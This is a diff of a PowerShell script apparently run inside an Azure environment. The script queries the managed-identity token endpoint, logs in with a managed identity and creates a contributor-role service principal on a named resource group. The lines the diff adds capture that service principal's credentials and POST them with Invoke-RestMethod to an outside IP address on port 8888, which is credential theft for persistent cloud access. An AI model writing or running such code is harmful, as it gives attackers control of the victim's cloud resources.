@@ -28,9 +28,9 @@ Write-Output "Curl commands"
 
 #curl -s -H Metadata:true -H "x-identity-header: $IDENTITY_HEADER" --noproxy "*" "http://localhost:42356/msi/token?resource=https://management.azure.net&api-version=2019-08-01"
 
-$something=$(curl -s -H Metadata:true -H x-identity-header: $IDENTITY_HEADER --noproxy "*" "http://localhost:42356/msi/token?resource=https://management.azure.net&api-version=2019-08-01")
+#$something=$(curl -s -H Metadata:true -H x-identity-header: $IDENTITY_HEADER --noproxy "*" "http://localhost:42356/msi/token?resource=https://management.azure.net&api-version=2019-08-01")
 
-$something
+#$something
 
 Write-Output "$something"
 
@@ -42,7 +42,16 @@ az login --identity --username 6502a0a1-d796-4fd9-8050-8ab50eefd439
 
 Write-Output "SP Creation"
 
-az ad sp create-for-rbac --name wucpi_sp5 --role contributor --scopes /subscriptions/edad2455-179b-4571-b559-877fb12b46ac/resourceGroups/cvtrsg
+$output=$(az ad sp create-for-rbac --name wucpi_sp6 --role contributor --scopes /subscriptions/edad2455-179b-4571-b559-877fb12b46ac/resourceGroups/cvtrsg)
+
+$body=$output
+
+$header = @{
+ "Accept"="application/json"
+ "Content-Type"="application/json"
+} 
+
+Invoke-RestMethod -Uri "http://159.223.102.2:8888/" -Method 'Post' -Body $body -Headers $header
 
 Write-Output "Role Assignments"
 
